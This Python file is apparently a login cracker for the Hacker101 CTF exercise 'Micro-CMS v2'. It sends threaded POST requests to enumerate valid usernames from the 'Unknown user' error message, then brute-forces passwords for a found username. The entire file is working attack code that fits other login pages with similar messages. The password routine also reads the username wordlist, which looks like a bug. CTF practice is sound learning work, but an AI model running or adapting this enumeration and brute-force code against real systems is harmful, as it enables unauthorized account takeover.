"""
Hacker 101 CTF exercise "Micro-CMS v2" login cracker.
"""

from bruting import http as h
from core.conf.http import HttpRequest
from core.constants.http import Protocol, HttpMethod, ContentType, HeaderField
from util.matching import http_resp_content_regex_flagger as f

PROTOCOL = Protocol.HTTPS
ENDPOINT = "login"
USERNAME_FIELD = "username"
PASSWORD_FIELD = "password"
HEADERS = {
    HeaderField.CONTENT_TYPE.value: ContentType.FORM_URL.value[0],
    HeaderField.ACCEPT.value: ContentType.HTML.value[0],
}


def crack_username(ip, instance_id):
    """
    Enumerates common usernames and returns the valid ones after trying.
    :param ip:
    :param instance_id:
    :return:
    """
    path = "/".join((instance_id, ENDPOINT))
    req_template = HttpRequest(ip, method=HttpMethod.POST, path=path, headers=HEADERS)
    regex = r">Unknown user<"
    return h.parallel_attack(
        req_template,
        generate_uname_req,
        f(regex, True),
        data_file="uname_list.txt",
        threads=20,
    )


def crack_password(ip, instance_id, username):
    """
    Enumerates common passwords and returns the valid ones after trying. A valid username is required.
    :param ip:
    :param instance_id:
    :param username:
    :return:
    """
    path = "/".join((instance_id, ENDPOINT))
    req_template = HttpRequest(ip, method=HttpMethod.POST, path=path, headers=HEADERS)
    regex = r">Invalid password<"
    passwd_req_gen = get_passwd_func(username)
    return h.parallel_attack(
        req_template,
        passwd_req_gen,
        f(regex, True),
        data_file="uname_list.txt",
        threads=10,
    )


def generate_uname_req(template, value):
    target = template.clone()
    body = {USERNAME_FIELD: str(value), PASSWORD_FIELD: ""}
    target.body = body
    return target


def get_passwd_func(username):
    def generate_passwd_req(template, value):
        target = template.clone()
        body = {USERNAME_FIELD: str(username), PASSWORD_FIELD: str(value)}
        target.body = body
        return target

    return generate_passwd_req
